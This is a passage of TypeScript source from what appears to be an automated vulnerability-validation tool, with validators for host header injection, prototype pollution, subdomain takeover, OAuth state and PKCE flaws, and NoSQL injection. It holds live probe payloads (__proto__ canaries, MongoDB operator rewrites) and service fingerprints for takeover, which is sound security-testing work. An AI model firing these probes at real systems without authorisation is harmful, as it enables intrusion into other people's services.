        reflectedInRedirect = true;
        confidence = Math.min(100, confidence + 40);
        steps.push(`  ✓ CONFIRMED: ${headerName} controls Location`);
        break;
      }

      if (bodyHit && !reflectedInBody) {
        reflectedInBody = true;
        firingHeader = headerName;
        confidence = Math.min(100, confidence + 20);
      }
    }

    // Body-only reflection needs a clean-request control to confirm.
    if (!confirmed && reflectedInBody) {
      const cleanResult = await config.executeCommand(
        buildCurlArgv({ url: targetUrl, authHeaders: config.authHeaders, authCookies: config.authCookies }),
        finding.target
      );
      if (cleanResult.stdout.toLowerCase().includes(evilHost)) {
        confidence = Math.max(0, confidence - 40);
        steps.push('FALSE POSITIVE: clean request (no header injection) also contains evil host');
        reflectedInBody = false;
        firingHeader = null;
      } else {
        confirmed = true;
        steps.push(`✓ CONFIRMED: ${firingHeader} reflects in body (clean request does not)`);
      }
    }

    if (!confirmed) steps.push(`All ${HOST_OVERRIDE_HEADERS.length} override headers tested; no injection confirmed`);

    return {
      findingId: finding.id,
      confirmed,
      evidence,
      reproductionSteps: steps,
      confidence,
      validatorUsed: firingHeader
        ? `host_header_injection (${firingHeader}, ${reflectedInRedirect ? 'redirect' : 'body'})`
        : 'host_header_injection',
      validationTime: Date.now() - startTime,
    };
  },
});

// ─── Prototype Pollution Validator ──────────────────────────────────────────

registerValidator({
  vulnType: 'prototype_pollution',
  async validate(finding, config): Promise<ValidationResult> {
    const startTime = Date.now();
    const evidence: ValidationEvidence[] = [];
    const steps: string[] = [];

    const targetUrl = finding.target;
    let confirmed = false;
    let confidence = finding.confidence;

    // Step 1: Re-send the __proto__ payload from the finding
    const result1 = await config.executeCommand(
      buildCurlArgv({
        url: targetUrl, dumpHeaders: true,
        authHeaders: config.authHeaders, authCookies: config.authCookies,
      }),
      finding.target
    );

    evidence.push({
      type: 'http_response',
      description: 'Response to prototype pollution payload',
      data: result1.stdout.substring(0, 5000),
      timestamp: Date.now(),
    });

    const statusMatch = result1.stdout.match(/HTTP\/[\d.]+ (\d{3})/);
    const statusCode = statusMatch ? parseInt(statusMatch[1], 10) : 0;
    steps.push(`Payload request returned status: ${statusCode}`);

    // Check if server-side prototype pollution caused observable changes:
    // 1. 500 error (crash from pollution)
    // 2. Response body contains unexpected properties
    // 3. Response headers contain unexpected values

    if (statusCode === 500) {
      confidence = Math.min(100, confidence + 15);
      steps.push('Server returned 500 — possible crash from prototype pollution');
    }

    // Step 2: Test with a canary — inject a unique property via __proto__
    // and check if it appears in a subsequent response
    const canary = `huntress_pp_${Date.now()}`;
    const protoPayloads = [
      `{"__proto__":{"polluted":"${canary}"}}`,
      `{"constructor":{"prototype":{"polluted":"${canary}"}}}`,
    ];

    for (const payload of protoPayloads) {
      // Try JSON body injection
      const injectResult = await config.executeCommand(
        buildCurlArgv({
          url: targetUrl, method: 'POST',
          body: payload, contentType: 'application/json',
          authHeaders: config.authHeaders, authCookies: config.authCookies,
        }),
        finding.target
      );

      // Check if canary appears in the response
      if (injectResult.stdout.includes(canary)) {
        confirmed = true;
        confidence = Math.min(100, confidence + 35);
        steps.push(`Canary "${canary}" reflected in response — prototype pollution confirmed`);

        evidence.push({
          type: 'http_response',
          description: 'Response containing canary from __proto__ injection',
          data: injectResult.stdout.substring(0, 5000),
          timestamp: Date.now(),
        });
        break;
      }

      // Also check if the pollution persists — make a clean GET request and see if canary appears
      const verifyResult = await config.executeCommand(
        buildCurlArgv({ url: targetUrl, authHeaders: config.authHeaders, authCookies: config.authCookies }),
        finding.target
      );

      if (verifyResult.stdout.includes(canary)) {
        confirmed = true;
        confidence = Math.min(100, confidence + 40);
        steps.push(`Canary "${canary}" persisted across requests — server-side prototype pollution confirmed`);

        evidence.push({
          type: 'http_response',
          description: 'Clean request contains canary from prior __proto__ injection',
          data: verifyResult.stdout.substring(0, 5000),
          timestamp: Date.now(),
        });
        break;
      }
    }

    if (!confirmed) {
      steps.push('Canary not reflected or persisted — checking for client-side pollution');

      // Step 3: Use Playwright for client-side/DOM-based prototype pollution
      try {
        const browser = await getSharedBrowser();
        const analysisResult = await browser.navigateAndAnalyze(targetUrl);

        // Check if there are any JS errors that might indicate pollution impact
        const pollutionErrors = analysisResult.consoleLogs.filter(
          l => l.level === 'error' && (
            l.text.includes('prototype') ||
            l.text.includes('__proto__') ||
            l.text.includes('constructor')
          )
        );

        if (pollutionErrors.length > 0) {
          confidence = Math.min(100, confidence + 15);
          steps.push(`Client-side prototype-related errors: ${pollutionErrors.length}`);

          evidence.push({
            type: 'script_output',
            description: 'Prototype-related console errors',
            data: pollutionErrors.map(e => e.text).join('\n'),
            timestamp: Date.now(),
          });
        }
      } catch {
        steps.push('Playwright unavailable — skipping client-side check');
      }
    }

    return {
      findingId: finding.id,
      confirmed,
      evidence,
      reproductionSteps: steps,
      confidence,
      validatorUsed: 'prototype_pollution',
      validationTime: Date.now() - startTime,
    };
  },
});

// ─── Subdomain Takeover Validator ───────────────────────────────────────────

registerValidator({
  vulnType: 'subdomain_takeover',
  async validate(finding, config): Promise<ValidationResult> {
    const startTime = Date.now();
    const evidence: ValidationEvidence[] = [];
    const steps: string[] = [];

    const target = finding.target;
    let confirmed = false;
    let confidence = finding.confidence;

    // Extract hostname from target
    let hostname = target;
    try {
      const parsed = new URL(target.startsWith('http') ? target : `https://${target}`);
      hostname = parsed.hostname;
    } catch { /* use raw target */ }

    // Step 1: Fresh DNS CNAME lookup to verify the dangling CNAME still exists
    const dnsResult = await config.executeCommand(
      `dig +short CNAME ${hostname}`,
      finding.target
    );

    const cnameTarget = dnsResult.stdout.trim().replace(/\.$/, '');
    steps.push(`DNS CNAME for ${hostname}: ${cnameTarget || 'no CNAME record'}`);

    if (!cnameTarget) {
      // No CNAME — might have been fixed
      confidence = Math.max(0, confidence - 30);
      steps.push('No CNAME found — subdomain may have been reclaimed');

      return {
        findingId: finding.id,
        confirmed: false,
        evidence,
        reproductionSteps: steps,
        confidence,
        validatorUsed: 'subdomain_takeover',
        validationTime: Date.now() - startTime,
      };
    }

    evidence.push({
      type: 'http_response',
      description: `DNS CNAME record for ${hostname}`,
      data: `${hostname} CNAME ${cnameTarget}`,
      timestamp: Date.now(),
    });

    // Step 2: Check if the CNAME target resolves (if it doesn't, it's dangling)
    const resolveResult = await config.executeCommand(
      `dig +short A ${cnameTarget}`,
      finding.target
    );

    const cnameResolved = resolveResult.stdout.trim().length > 0;
    steps.push(`CNAME target ${cnameTarget} resolves: ${cnameResolved ? 'YES' : 'NO'}`);

    // Step 3: Known vulnerable service fingerprints
    const vulnerableServices: Record<string, RegExp[]> = {
      'GitHub Pages': [/There isn't a GitHub Pages site here/i, /For root URLs.*you must provide an index\.html/i],
      'Heroku': [/No such app/i, /herokucdn\.com\/error-pages/i],
      'AWS S3': [/NoSuchBucket/i, /The specified bucket does not exist/i],
      'Shopify': [/Sorry, this shop is currently unavailable/i],
      'Tumblr': [/There's nothing here/i, /Whatever you were looking for doesn't currently exist/i],
      'WordPress.com': [/Do you want to register/i],
      'Pantheon': [/The gods are wise/i, /404 error unknown site/i],
      'Fastly': [/Fastly error: unknown domain/i],
      'Ghost': [/The thing you were looking for is no longer here/i],
      'Surge.sh': [/project not found/i],
      'Fly.io': [/404 Not Found/i],
      'Azure': [/Web App - Pair with a custom domain/i],
      'Zendesk': [/Help Center Closed/i],
    };

    // Step 4: HTTP request to the target to check for service error pages.
    // No auth pass-through: hostname is the takeover-candidate host, not
    // the user's authenticated target, and follow-redirects would forward
    // headers off-origin. See note on open_redirect for the rationale.
    const httpResult = await config.executeCommand(
      buildCurlArgv({
        url: `https://${hostname}`, dumpHeaders: true,
        followRedirects: true, maxRedirects: 3,
        headers: { 'Host': hostname },
      }),
      finding.target
    );

    evidence.push({
      type: 'http_response',
      description: `HTTP response from ${hostname}`,
      data: httpResult.stdout.substring(0, 5000),
      timestamp: Date.now(),
    });

    let detectedService: string | null = null;
    for (const [service, patterns] of Object.entries(vulnerableServices)) {
      for (const pattern of patterns) {
        if (pattern.test(httpResult.stdout)) {
          detectedService = service;
          break;
        }
      }
      if (detectedService) break;
    }

    if (detectedService) {
      confirmed = true;
      confidence = Math.min(100, confidence + 35);
      steps.push(`Vulnerable service detected: ${detectedService}`);
      steps.push('Service is returning unclaimed/error page — takeover possible');
    } else if (!cnameResolved) {
      // CNAME exists but doesn't resolve — strong indicator of dangling CNAME
      confirmed = true;
      confidence = Math.min(100, confidence + 25);
      steps.push('CNAME exists but target does not resolve — dangling CNAME confirmed');
    } else {
      steps.push('CNAME resolves and no vulnerable service fingerprint detected');
    }

    // Step 5: Also try HTTP on the CNAME target directly (some services respond differently)
    if (!confirmed) {
      const cnameHttpResult = await config.executeCommand(
        buildCurlArgv({
          url: `https://${cnameTarget}`, discardBody: true, writeOut: '%{http_code}',
        }),
        finding.target
      );

      const cnameStatus = parseInt(cnameHttpResult.stdout.trim(), 10);
      steps.push(`CNAME target HTTP status: ${cnameStatus || 'connection failed'}`);

      if (isNaN(cnameStatus) || cnameStatus === 0) {
        // Connection failed — service is down
        confidence = Math.min(100, confidence + 15);
        steps.push('CNAME target unreachable — potential dangling CNAME');
      }
    }

    return {
      findingId: finding.id,
      confirmed,
      evidence,
      reproductionSteps: steps,
      confidence,
      validatorUsed: 'subdomain_takeover',
      validationTime: Date.now() - startTime,
    };
  },
});

// ─── OAuth Validators (H24 — Hunt #7 Fix) ─────────────────────────────────
// All 9 oauth_* finding types need concrete validators that verify
// exploitation evidence, not just HTTP 200 status codes.

/**
 * Shared helper for OAuth validators: extract the OAuth authorization endpoint
 * from the finding's target URL or evidence.
 */
function extractOAuthEndpoint(finding: ReactFinding): string {
  // Use the finding target directly — agents set this to the OAuth endpoint
  return finding.target;
}

/**
 * Check if an HTTP response indicates the server accepted the OAuth request
 * (2xx or 3xx redirect to a legitimate redirect_uri), not just returned HTML.
 */
function isOAuthFlowAccepted(response: string): boolean {
  // Check for redirect to callback URI (the flow was accepted)
  const statusMatch = response.match(/HTTP\/[\d.]+ (\d{3})/);
  const status = statusMatch ? parseInt(statusMatch[1], 10) : 0;
  if (status >= 300 && status < 400) return true;

  // Check for authorization code in Location or body
  if (/[?&]code=/.test(response)) return true;
  if (/[?&]access_token=/.test(response)) return true;

  return false;
}

// oauth_missing_state — Server accepts OAuth flow without state parameter
registerValidator({
  vulnType: 'oauth_missing_state',
  async validate(finding, config): Promise<ValidationResult> {
    const startTime = Date.now();
    const evidence: ValidationEvidence[] = [];
    const steps: string[] = [];
    let confirmed = false;
    let confidence = finding.confidence;

    const endpoint = extractOAuthEndpoint(finding);
    steps.push(`Testing OAuth endpoint: ${endpoint}`);

    // Step 1: Send OAuth authorization request WITHOUT state parameter
    // Remove state param if present, keep other params
    let statelessUrl = endpoint;
    try {
      const url = new URL(endpoint);
      url.searchParams.delete('state');
      statelessUrl = url.toString();
    } catch {
      // If not a valid URL, try regex removal
      statelessUrl = endpoint.replace(/[?&]state=[^&]*/g, '');
    }

    // No auth pass-through: OAuth flows redirect between app and IdP,
    // and curl -L re-sends custom headers cross-origin. See open_redirect
    // note for rationale.
    const result = await config.executeCommand(
      buildCurlArgv({
        url: statelessUrl, dumpHeaders: true,
        followRedirects: true, maxRedirects: 3,
      }),
      finding.target
    );

    evidence.push({
      type: 'http_request',
      description: 'OAuth request without state parameter',
      data: `GET ${statelessUrl}`,
      timestamp: Date.now(),
    });

    evidence.push({
      type: 'http_response',
      description: 'Server response to stateless request',
      data: result.stdout.substring(0, 5000),
      timestamp: Date.now(),
    });

    steps.push(`Sent request without state parameter`);

    // Step 2: Check if server accepted the request (redirect or auth code)
    if (isOAuthFlowAccepted(result.stdout)) {
      confirmed = true;
      confidence = Math.min(100, confidence + 30);
      steps.push('Server accepted OAuth flow without state parameter — CSRF possible');
    } else {
      // Check if server returned 400/error requiring state
      const statusMatch = result.stdout.match(/HTTP\/[\d.]+ (\d{3})/);
      const status = statusMatch ? parseInt(statusMatch[1], 10) : 0;
      if (status === 400 || status === 403) {
        steps.push(`Server rejected stateless request (HTTP ${status}) — state is enforced`);
        confidence = Math.max(0, confidence - 40);
      } else {
        steps.push(`Inconclusive: HTTP ${status}, no redirect or code in response`);
      }
    }

    return {
      findingId: finding.id,
      confirmed,
      evidence,
      reproductionSteps: steps,
      confidence,
      validatorUsed: 'oauth_missing_state',
      validationTime: Date.now() - startTime,
    };
  },
});

// oauth_downgrade_attack — Server accepts OAuth without PKCE code_challenge
registerValidator({
  vulnType: 'oauth_downgrade_attack',
  async validate(finding, config): Promise<ValidationResult> {
    const startTime = Date.now();
    const evidence: ValidationEvidence[] = [];
    const steps: string[] = [];
    let confirmed = false;
    let confidence = finding.confidence;

    const endpoint = extractOAuthEndpoint(finding);

    // Step 1: Send request WITH code_challenge.
    // No auth pass-through (OAuth redirects cross-origin — see open_redirect).
    const result1 = await config.executeCommand(
      buildCurlArgv({
        url: endpoint, dumpHeaders: true,
        followRedirects: true, maxRedirects: 3,
      }),
      finding.target
    );

    evidence.push({
      type: 'http_response',
      description: 'Response with code_challenge present',
      data: result1.stdout.substring(0, 3000),
      timestamp: Date.now(),
    });
    steps.push('Sent request with code_challenge parameter');

    // Step 2: Send request WITHOUT code_challenge
    let noChallengeUrl = endpoint;
    try {
      const url = new URL(endpoint);
      url.searchParams.delete('code_challenge');
      url.searchParams.delete('code_challenge_method');
      noChallengeUrl = url.toString();
    } catch {
      noChallengeUrl = endpoint
        .replace(/[?&]code_challenge=[^&]*/g, '')
        .replace(/[?&]code_challenge_method=[^&]*/g, '');
    }

    const result2 = await config.executeCommand(
      buildCurlArgv({
        url: noChallengeUrl, dumpHeaders: true,
        followRedirects: true, maxRedirects: 3,
      }),
      finding.target
    );

    evidence.push({
      type: 'http_response',
      description: 'Response without code_challenge (downgrade attempt)',
      data: result2.stdout.substring(0, 3000),
      timestamp: Date.now(),
    });
    steps.push('Sent request without code_challenge (downgrade attempt)');

    // Step 3: Check if BOTH requests were accepted (codes issued)
    const withChallenge = isOAuthFlowAccepted(result1.stdout);
    const withoutChallenge = isOAuthFlowAccepted(result2.stdout);

    if (withChallenge && withoutChallenge) {
      confirmed = true;
      confidence = Math.min(100, confidence + 30);
      steps.push('Both requests accepted — PKCE can be downgraded');
    } else if (withoutChallenge && !withChallenge) {
      steps.push('Only non-PKCE request accepted — unexpected but still a downgrade');
      confidence = Math.min(100, confidence + 10);
    } else if (!withoutChallenge) {
      steps.push('Server rejected request without code_challenge — PKCE enforced');
      confidence = Math.max(0, confidence - 40);
    }

    return {
      findingId: finding.id,
      confirmed,
      evidence,
      reproductionSteps: steps,
      confidence,
      validatorUsed: 'oauth_downgrade_attack',
      validationTime: Date.now() - startTime,
    };
  },
});

// oauth_weak_verifier — PKCE verifier is too short (< 43 chars per RFC 7636)
registerValidator({
  vulnType: 'oauth_weak_verifier',
  async validate(finding, config): Promise<ValidationResult> {
    const startTime = Date.now();
    const evidence: ValidationEvidence[] = [];
    const steps: string[] = [];
    let confirmed = false;
    let confidence = finding.confidence;

    const endpoint = extractOAuthEndpoint(finding);

    // Extract the code_verifier from finding evidence
    const verifierMatch = finding.evidence.join(' ').match(/code_verifier[=:]\s*([^\s&"]+)/i);
    const verifier = verifierMatch ? verifierMatch[1] : '';

    if (verifier && verifier.length < 43) {
      steps.push(`Weak verifier found: length ${verifier.length} (RFC 7636 minimum: 43)`);

      // Verify the server accepted the weak verifier.
      // No auth pass-through (OAuth endpoint; cross-origin redirect risk).
      const result = await config.executeCommand(
        buildCurlArgv({ url: endpoint, dumpHeaders: true }),
        finding.target
      );

      evidence.push({
        type: 'http_response',
        description: `Server response with weak verifier (length ${verifier.length})`,
        data: result.stdout.substring(0, 3000),
        timestamp: Date.now(),
      });

      if (isOAuthFlowAccepted(result.stdout) || result.stdout.includes('access_token')) {
        confirmed = true;
        confidence = Math.min(100, confidence + 35);
        steps.push('Server accepted weak verifier — vulnerable to brute-force');
      } else {
        steps.push('Server may have rejected the weak verifier');
      }
    } else if (verifier) {
      steps.push(`Verifier length ${verifier.length} meets RFC 7636 minimum (43) — not weak`);
      confidence = Math.max(0, confidence - 50);
    } else {
      steps.push('No code_verifier found in evidence — cannot verify');
      confidence = Math.max(0, confidence - 30);
    }

    return {
      findingId: finding.id,
      confirmed,
      evidence,
      reproductionSteps: steps,
      confidence,
      validatorUsed: 'oauth_weak_verifier',
      validationTime: Date.now() - startTime,
    };
  },
});

// oauth_scope_escalation — Server grants elevated scope beyond what was authorized
registerValidator({
  vulnType: 'oauth_scope_escalation',
  async validate(finding, config): Promise<ValidationResult> {
    const startTime = Date.now();
    const evidence: ValidationEvidence[] = [];
    const steps: string[] = [];
    let confirmed = false;
    let confidence = finding.confidence;

    const endpoint = extractOAuthEndpoint(finding);

    // Re-send the request that claims scope escalation.
    // No auth pass-through (OAuth endpoint; cross-origin redirect risk).
    const result = await config.executeCommand(
      buildCurlArgv({
        url: endpoint, dumpHeaders: true,
        followRedirects: true, maxRedirects: 3,
      }),
      finding.target
    );

    evidence.push({
      type: 'http_response',
      description: 'Response to scope escalation request',
      data: result.stdout.substring(0, 5000),
      timestamp: Date.now(),
    });
    steps.push('Re-sent OAuth request with escalated scope parameter');

    // Check if the response actually grants the escalated scope
    // Look for scope field in response body or token
    const grantedScope = result.stdout.match(/"scope"\s*:\s*"([^"]+)"/);
    const requestedScope = endpoint.match(/[?&]scope=([^&]+)/);

    if (grantedScope && requestedScope) {
      const granted = decodeURIComponent(grantedScope[1]);
      const requested = decodeURIComponent(requestedScope[1]);
      steps.push(`Requested scope: ${requested}`);
      steps.push(`Granted scope: ${granted}`);

      // Check if granted scope includes more permissions than a base scope
      if (granted.includes(requested) || granted.split(' ').length > 1) {
        confirmed = true;
        confidence = Math.min(100, confidence + 25);
        steps.push('Server granted escalated scope — privilege escalation confirmed');
      }
    } else if (isOAuthFlowAccepted(result.stdout)) {
      // Flow accepted but no explicit scope grant — check for code/token
      steps.push('Flow accepted but scope field not found in response — insufficient evidence');
      confidence = Math.max(0, confidence - 20);
    } else {
      steps.push('Server did not accept the escalated scope request');
      confidence = Math.max(0, confidence - 40);
    }

    return {
      findingId: finding.id,
      confirmed,
      evidence,
      reproductionSteps: steps,
      confidence,
      validatorUsed: 'oauth_scope_escalation',
      validationTime: Date.now() - startTime,
    };
  },
});

// Shared OAuth validator for remaining types — re-sends the request and checks
// for concrete exploitation evidence (not just HTTP 200)
for (const oauthType of [
  'oauth_state_reuse',
  'oauth_challenge_manipulation',
  'oauth_missing_validation',
  'oauth_scope_boundary',
  'oauth_scope_confusion',
] as const) {
  registerValidator({
    vulnType: oauthType,
    async validate(finding, config): Promise<ValidationResult> {
      const startTime = Date.now();
      const evidence: ValidationEvidence[] = [];
      const steps: string[] = [];
      let confirmed = false;
      let confidence = finding.confidence;

      const endpoint = extractOAuthEndpoint(finding);
      steps.push(`Validating ${oauthType} at ${endpoint}`);

      // Re-send the OAuth request from the finding.
      // No auth pass-through (OAuth flow crosses app ↔ IdP origins).
      const result = await config.executeCommand(
        buildCurlArgv({
          url: endpoint, dumpHeaders: true,
          followRedirects: true, maxRedirects: 3,
        }),
        finding.target
      );

      evidence.push({
        type: 'http_response',
        description: `Response to ${oauthType} validation request`,
        data: result.stdout.substring(0, 5000),
        timestamp: Date.now(),
      });

      // Check for concrete exploitation evidence
      if (isOAuthFlowAccepted(result.stdout)) {
        // Flow accepted — now check if there's evidence specific to the vuln type
        const hasCode = /[?&]code=/.test(result.stdout);
        const hasToken = /access_token/.test(result.stdout);

        if (hasCode || hasToken) {
          confirmed = true;
          confidence = Math.min(100, confidence + 25);
          steps.push(`OAuth flow accepted with ${hasCode ? 'authorization code' : 'access token'} — exploitable`);
        } else {
          steps.push('OAuth redirect accepted but no code/token in response');
          confidence = Math.min(100, confidence + 10);
        }
      } else {
        const statusMatch = result.stdout.match(/HTTP\/[\d.]+ (\d{3})/);
        const status = statusMatch ? parseInt(statusMatch[1], 10) : 0;
        steps.push(`Server returned HTTP ${status} — no exploitation evidence`);
        confidence = Math.max(0, confidence - 30);
      }

      return {
        findingId: finding.id,
        confirmed,
        evidence,
        reproductionSteps: steps,
        confidence,
        validatorUsed: oauthType,
        validationTime: Date.now() - startTime,
      };
    },
  });
}

// ─── Register remaining types as pass-through ────────────────────────────────
// ─── NoSQL Injection Validator ─────────────────────────────────────────────

registerValidator({
  vulnType: 'nosql_injection',
  async validate(finding, config): Promise<ValidationResult> {
    const startTime = Date.now();
    const evidence: ValidationEvidence[] = [];
    const steps: string[] = [];

    // Step 1: Send the original payload (expected to return data or "true" result)
    const injectedResult = await config.executeCommand(
      buildCurlArgv({
        url: finding.target, dumpHeaders: true,
        authHeaders: config.authHeaders, authCookies: config.authCookies,
      }),
      finding.target
    );

    evidence.push({
      type: 'http_response',
      description: 'Response with NoSQL injection payload (true condition)',
      data: injectedResult.stdout.substring(0, 5000),
      timestamp: Date.now(),
    });

    // Step 2: Send a "false" condition — modify the payload to get empty/different result
    // Replace common NoSQL true conditions with false equivalents
    let falseTarget = finding.target;
    // MongoDB operators: $gt → $lt with impossible value, $ne → $eq with impossible
    falseTarget = falseTarget.replace(/\$gt/g, '$eq');
    falseTarget = falseTarget.replace(/\$ne/g, '$eq');
    falseTarget = falseTarget.replace(/\$exists.*?true/g, '$exists":false');
    // If no substitution was made, try appending a falsy NoSQL condition
    if (falseTarget === finding.target) {
      falseTarget = finding.target.replace(/([?&])([^=]+)=([^&]+)/, '$1$2=____impossible_value_nosql_false____');
    }

    const falseResult = await config.executeCommand(
      buildCurlArgv({
        url: falseTarget, dumpHeaders: true,
        authHeaders: config.authHeaders, authCookies: config.authCookies,
      }),
      finding.target
    );

    evidence.push({
      type: 'http_response',
      description: 'Response with false/negated condition',
      data: falseResult.stdout.substring(0, 5000),
      timestamp: Date.now(),
    });

    // Differential analysis: true and false payloads should produce meaningfully different responses
    const trueBody = injectedResult.stdout.replace(/^[\s\S]*?\r?\n\r?\n/, '');
    const falseBody = falseResult.stdout.replace(/^[\s\S]*?\r?\n\r?\n/, '');
    const sizeDiff = Math.abs(trueBody.length - falseBody.length);
    const contentDiffers = trueBody !== falseBody;
    const significantDiff = sizeDiff > 50 || (contentDiffers && trueBody.length > 100);

    // Check for MongoDB error messages (strong indicator)
    const mongoErrors = [
      /\$where|MongoError|mongoDB/i,
      /\$gt|\$ne|\$regex|\$exists/,
      /operator.*not.*allowed/i,
      /unknown.*operator/i,
    ];
    const hasMongoError = mongoErrors.some(p => p.test(injectedResult.stdout));

    steps.push(`Injected payload URL: ${finding.target}`);
    steps.push(`False-condition URL: ${falseTarget}`);
    steps.push(`True response size: ${trueBody.length} bytes`);
    steps.push(`False response size: ${falseBody.length} bytes`);
    steps.push(`Content differs: ${contentDiffers ? 'YES' : 'no'} (size diff: ${sizeDiff} bytes)`);
    steps.push(`MongoDB error indicators: ${hasMongoError ? 'YES' : 'no'}`);

    const confirmed = (significantDiff && contentDiffers) || hasMongoError;
    let confidence = finding.confidence;
    if (significantDiff && contentDiffers) confidence = Math.min(100, confidence + 25);
    if (hasMongoError) confidence = Math.min(100, confidence + 30);
    if (!contentDiffers && !hasMongoError) confidence = Math.max(0, confidence - 30);

    return {
      findingId: finding.id,
      confirmed,
      evidence,
      reproductionSteps: steps,
      confidence,
      validatorUsed: 'nosql_injection',
      validationTime: Date.now() - startTime,
    };
  },
});

// ─── BOLA Validator (shares idor broken-access differential) ──────────────

registerValidator({
  vulnType: 'bola',
  async validate(finding, config): Promise<ValidationResult> {
    return validateBrokenAccess(finding, config, 'bola');
  },
});

// ─── Pass-through validators for remaining types ──────────────────────────
// These use the agent's confidence without additional validation

for (const vulnType of [
  'sqli_blind_boolean',
  'ssrf_blind',
  'csrf',
  'oauth_redirect_uri', 'oauth_state', 'oauth_pkce',
  'jwt_vulnerability',
  'information_disclosure', 'rate_limit_bypass',
  'graphql_introspection', 'graphql_batching',
  'mass_assignment', 'rce',
  'xxe_blind', 'command_injection_blind', 'lfi', 'lfi_rce',
  'race_condition', 'toctou', 'double_spend',
  'http_smuggling', 'cache_poisoning', 'cache_deception',
  'jwt_alg_confusion', 'jwt_none', 'jwt_kid_injection',
  'deserialization', 'saml_attack',
  'mfa_bypass', 'websocket', 'crlf_injection',
  'prompt_injection', 'business_logic',
  'other',
]) {
  registerValidator({
    vulnType,
    async validate(finding): Promise<ValidationResult> {
      // Pass-through: use agent's confidence, mark as needing manual validation
      return {
        findingId: finding.id,
        confirmed: finding.confidence >= 80,
        evidence: finding.evidence.map(e => ({
          type: 'script_output' as const,
          description: 'Evidence from agent',
          data: e,
          timestamp: Date.now(),
        })),
        reproductionSteps: finding.reproductionSteps,
        confidence: finding.confidence,
        validatorUsed: `${vulnType}_passthrough`,
        validationTime: 0,
      };
    },
  });
}

export default validateFinding;
